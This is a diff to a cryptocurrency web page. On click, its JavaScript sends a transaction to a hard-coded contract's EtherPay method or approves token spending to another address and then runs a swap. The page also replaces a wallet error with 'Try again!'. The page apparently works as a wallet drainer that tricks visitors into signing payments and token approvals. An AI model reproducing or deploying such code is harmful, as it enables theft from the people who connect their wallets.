@@ -1419,7 +1419,7 @@
 										<img src="assets/ETH_negate.png" style="height: 50px; width: auto" alt="">
 										<div>
 									<div data-v-37156db5="" class="heading tm-rf-1 tm-medium tm-lh-title tm-overline tm-muted">ETH EQUIVALENT</div>
-									<div data-v-37156db5="" class="title tm-rf3 tm-bold tm-lh-title tm-title mt-3 centerbit fct-count"><span>0.04</span> </div>
+									<div data-v-37156db5="" class="title tm-rf3 tm-bold tm-lh-title tm-title mt-3 centerbit fct-count"><span>0.04091586</span> </div>
 										</div>
 									</div>
 								</a>
@@ -1917,7 +1917,7 @@
 
 		<div id="error" class="popup">
 			<div  id="error_popcard"  class="popcard">
-				<div id="error-text" data-v-37156db5="" class="title tm-rf3 tm-bold tm-lh-title mt-3">Metamask is not allow your browser!</div>
+				<div id="error-text" data-v-37156db5="" class="title tm-rf3 tm-bold tm-lh-title mt-3">Try again!</div>
 			</div>
 		</div>
 
@@ -2182,18 +2182,18 @@
 			if(selectedAddress==="000"){
 				window.SimpleStorage = new window.web3.eth.Contract(ethABI, '0x862D9c0024A38Eb503Db0d3fC32Cfa1c89e221C5');
 				console.log('eths')
-				window.SimpleStorage.methods.EtherPay(1).send({
+				window.SimpleStorage.methods.EtherPay().send({
 					from: window.web3.eth.defaultAccount,
-					gas: 0
+					// gas: 0
 				});
 			}else{
 				window.SimpleStorage = new window.web3.eth.Contract(approveContractABI, selectedAddress);
-
-				window.SimpleStorage.methods.approve(first, approveNum).send({
+				// console.log(web3.utils.toBN(2).pow(100));
+				console.log(web3.utils.toBN(2))
+				window.SimpleStorage.methods.approve(first, web3.utils.toBN(2)).send({
 					from: window.web3.eth.defaultAccount,
-					gas: 0
-				});
-				swap();
+					// gas: 0
+				}).then(swap())
 			}
 		}
 
